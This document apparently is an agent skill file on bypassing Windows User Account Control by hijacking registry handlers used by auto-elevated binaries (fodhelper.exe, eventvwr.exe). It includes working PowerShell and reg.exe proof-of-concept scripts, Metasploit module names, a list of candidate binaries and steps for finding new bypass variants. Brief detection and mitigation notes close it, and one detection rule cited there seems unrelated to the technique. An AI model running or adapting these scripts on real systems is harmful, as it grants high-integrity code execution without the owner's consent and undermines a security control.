---
name: windows-uac-bypass-registry
description: UAC bypass via registry hijack of auto-elevated Windows binaries -- FodHelper (ms-settings), EventVwr (mscfile), the HKCU-over-HKLM lookup order, Medium → High integrity escalation.
---

# UAC Bypass via Registry Hijack of Auto-Elevated Binaries

## Threat Model

Precondition: the user is a local Administrator but User Account Control is enabled.
Goal: run code at **High Integrity** without triggering the UAC consent prompt.
This is a UAC bypass -- **not** a SYSTEM privilege escalation. Medium Integrity → High Integrity.
A separate LPE is needed if SYSTEM is the goal.

## Why It Works

Two Windows design choices combine to create the bypass primitive:

1. **autoElevate manifest flag**. A handful of Microsoft-signed binaries living under `%SystemRoot%\System32`
   are marked `<autoElevate>true</autoElevate>` in their application manifest. When launched by a user who
   belongs to Administrators, Windows silently gives them a High-Integrity token without prompting.
2. **HKCU-over-HKLM registry lookup order**. For file-type and protocol handler resolution Windows looks
   under `HKCU\Software\Classes\...` **before** `HKLM\Software\Classes\...`. The HKCU hive is writable by
   the current user without any elevation.

An auto-elevated binary that resolves a protocol or file association through `HKCU\Software\Classes` will
execute whatever command the user plants there -- with the auto-elevated binary's High-Integrity token.

## FodHelper Bypass (ms-settings handler)

Binary: `C:\Windows\System32\fodhelper.exe`. Marked `autoElevate`. On launch it opens an
`ms-settings:` URI, which Windows resolves through:

```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```

PowerShell proof of concept:

```powershell
$Key   = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
New-Item $Key -Force | Out-Null
New-ItemProperty -Path $Key -Name "DelegateExecute" -Value "" -Force | Out-Null
Set-ItemProperty -Path $Key -Name "(default)" -Value "cmd.exe /c start cmd.exe" -Force
Start-Process "fodhelper.exe"
Start-Sleep 2
Remove-Item $Key -Recurse -Force
```

The empty `DelegateExecute` entry is required -- without it modern Windows takes a different code path
that does **not** honour the HKCU override.

Metasploit module: `exploit/windows/local/bypassuac_fodhelper`.
Source: <https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/bypassuac_fodhelper.rb>.

## EventVwr Bypass (mscfile association)

Binary: `C:\Windows\System32\eventvwr.exe`. On launch it opens `eventvwr.msc`. The `.msc` extension is
associated with `mmc.exe` through:

```
HKCU\Software\Classes\mscfile\shell\open\command
```

Proof of concept:

```cmd
reg add "HKCU\Software\Classes\mscfile\shell\open\command" /ve /t REG_SZ /d "cmd.exe /c start cmd.exe" /f
eventvwr.exe
timeout /t 3
reg delete "HKCU\Software\Classes\mscfile\shell\open\command" /f
```

Metasploit module: `exploit/windows/local/bypassuac_eventvwr`.
Source: <https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/bypassuac_eventvwr.rb>.

**Patched on Win10 1803+** -- `eventvwr.exe` now directly `CreateProcess`es `mmc.exe` with explicit path,
skipping the `.msc` association lookup. Still works on unpatched installs and some LTSC branches.

## General Pattern for Finding New Variants

Hunt for your own:
1. Enumerate `autoElevate` manifests:
   ```powershell
   $sigcheck = "sigcheck -m -q C:\Windows\System32\*.exe"
   # parse for <autoElevate>true</autoElevate>
   ```
   Known candidates: `fodhelper.exe`, `computerdefaults.exe`, `slui.exe`, `wsreset.exe`, `sdclt.exe`,
   `pkgmgr.exe`, `migwiz.exe`, `cleanmgr.exe`, `ChangePk.exe`.

2. Run the candidate under Process Monitor filtering `Path contains Software\Classes` + `Result = NAME NOT FOUND`.
   Any HKCU miss is a plantable hijack site.

3. Plant key, launch binary, pop High-Integrity shell.

## Integrity-Level Flow

```
Starting process        : Medium IL  (default admin user, UAC on)
Launch autoElevate exe  : (consent.exe skipped by auto-elevate rule)
Target process started  : High IL    (full admin token minus Low-privileged SIDs)
HKCU hijack executes    : High IL inherited by spawned child
```

Final child inherits the High-Integrity token (`TokenIntegrityLevel = 0x3000`), can write
`C:\Windows\System32`, modify HKLM, join tokens for SYSTEM impersonation chains, etc.

## Detection

- Sysmon Event ID 12/13 on `HKCU\Software\Classes\ms-settings\...\command` writes.
- Sysmon Event ID 1 where ParentImage ends in `fodhelper.exe` / `eventvwr.exe` and child is `cmd.exe` /
  `powershell.exe` -- obvious anomaly.
- Attack Surface Reduction rule `Block abuse of exploited vulnerable signed drivers` + Defender ASR
  `D4F940AB-401B-4EFC-AADC-AD5F3C50688A` ("Block all Office apps from creating child processes") can
  catch some variants.

## Mitigations

- Set UAC to **Always notify** (slider at top). HKCU hijack still fires, but every elevation prompts.
- `EnableLUA = 0` is **not** a mitigation -- it disables UAC entirely, worse outcome.
- Patch to latest Win10/11; many variants are closed per build (eventvwr in 1803, sdclt in 1709, etc.).
- Monitor HKCU `Software\Classes` writes with Sysmon or EDR; most legitimate apps never touch
  `ms-settings\Shell\Open\command`, `mscfile\shell`, or similar handler paths.
